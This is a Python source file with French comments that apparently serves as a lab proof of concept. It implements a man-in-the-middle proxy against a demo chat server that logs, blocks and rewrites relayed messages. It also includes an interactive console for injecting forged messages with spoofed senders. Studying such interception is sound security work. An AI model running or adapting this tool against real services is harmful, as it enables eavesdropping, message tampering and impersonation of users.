import socket
import threading
import json
import os
import logging

REAL_SERVER = 'poc-server'
REAL_PORT = 5000
PROXY_PORT = 5000
LOG_FILE = "logs/mitm.log"
BLOCKED_KEYWORDS = ["secret", "motdepasse"]
MODIFICATIONS = {
    "remplace": "***",
    "topsecret": "censuré"
}

os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

def log_packet(prefix, original, modified=None, blocked_reason=None):
    """
    Enregistre les paquets dans le fichier de log,
    sauf s'il s'agit d'une requête 'get_messages'.
    """
    try:
        parsed = json.loads(original)
        if parsed.get("action") != "send_message":
            return  # Ne loggue rien sauf les 'send_message'

        logging.info(f"{prefix} (ORIGINAL):\n{json.dumps(parsed, indent=2)}")
        print(f"{prefix} (ORIGINAL):\n{json.dumps(parsed, indent=2)}\n")

        if blocked_reason:
            logging.warning(f"{prefix} Message bloqué (mot interdit : '{blocked_reason}')")
            print(f"{prefix} Message bloqué (mot interdit : '{blocked_reason}')\n")

        elif modified and modified != original:
            parsed_mod = json.loads(modified)
            logging.info(f"{prefix} (MODIFIÉ):\n{json.dumps(parsed_mod, indent=2)}")
            print(f"{prefix} (MODIFIÉ):\n{json.dumps(parsed_mod, indent=2)}\n")

    except Exception as e:
        logging.error(f"Erreur log_packet : {e}")

def modify_payload(data):
    """
    Modifie le payload JSON selon les règles définies.
    :param data: Données à modifier.
    :return: Données modifiées ou None si bloquées.
    """
    try:
        req = json.loads(data)
    except:
        return data, None  # non JSON

    if req.get("action") == "send_message":
        msg = req.get("message", "")
        for keyword in BLOCKED_KEYWORDS:
            if keyword in msg.lower():
                return None, keyword  # bloqué
        for k, v in MODIFICATIONS.items():
            msg = msg.replace(k, v)
        req["message"] = msg
        return json.dumps(req), None

    return data, None


def handle_connection(client_conn, addr):
    """
    Gère la connexion entre le client et le serveur.
    :param client_conn: Connexion du client.
    :param addr: Adresse du client.
    """
    try:
        server_conn = socket.create_connection((REAL_SERVER, REAL_PORT))
    except Exception as e:
        logging.error(f"Connexion au serveur échouée : {e}")
        client_conn.close()
        return

    def from_client():
        """
        Gère le transfert de données du client vers le serveur.
        """
        while True:
            try:
                data = client_conn.recv(8192)
                if not data:
                    break
                data_str = data.decode()
                modified, blocked_reason = modify_payload(data_str)
                log_packet("Requête client", data_str, modified, blocked_reason)
                if modified is not None:
                    server_conn.sendall(modified.encode())
            except Exception as e:
                logging.error(f"Erreur client → serveur : {e}")
                break

    def from_server():
        """
        Gère le transfert de données du serveur vers le client.
        """
        while True:
            try:
                data = server_conn.recv(8192)
                if not data:
                    break
                data_str = data.decode()
                log_packet("Réponse serveur", data_str)
                client_conn.sendall(data)
            except Exception as e:
                logging.error(f"Erreur serveur → client : {e}")
                break

    threading.Thread(target=from_client, daemon=True).start()
    threading.Thread(target=from_server, daemon=True).start()

def start_proxy():
    """
    Démarre le proxy MITM.
    """
    print(f"MITM proxy en écoute sur le port {PROXY_PORT}...", flush=True)
    logging.info(f"MITM proxy démarré sur {PROXY_PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', PROXY_PORT))
        s.listen()
        while True:
            client_conn, addr = s.accept()
            threading.Thread(target=handle_connection, args=(client_conn, addr), daemon=True).start()

def interactive_attacker():
    """
    Interface interactive pour l'attaquant.
    Permet d'envoyer des messages falsifiés.
    """
    print("\n[MITM] Interface interactive prête.")
    while True:
        print("\n[MITM] Envoyer un faux message (laisser vide pour annuler)")
        fake_from = input("> De (expéditeur) : ").strip()
        if not fake_from:
            continue
        fake_to = input("> À (destinataire) : ").strip()
        if not fake_to:
            continue
        message = input("> Message : ").strip()
        if not message:
            continue

        fake_data = {
            "action": "send_message",
            "token": "MITM_FAKE",
            "sender": fake_from,
            "to": fake_to,
            "message": message
        }

        try:
            with socket.create_connection((REAL_SERVER, REAL_PORT)) as s:
                s.sendall(json.dumps(fake_data).encode())
                response = s.recv(8192).decode()
                log_packet("Message injecté par MITM", json.dumps(fake_data))
                logging.info(f"Réponse serveur à injection : {response}")
                print(f"[MITM] Injecté : {message}")
        except Exception as e:
            logging.error(f"[MITM] Erreur injection : {e}")
            print(f"[MITM] Erreur envoi : {e}")


if __name__ == "__main__":
    threading.Thread(target=interactive_attacker, daemon=True).start()
    start_proxy()
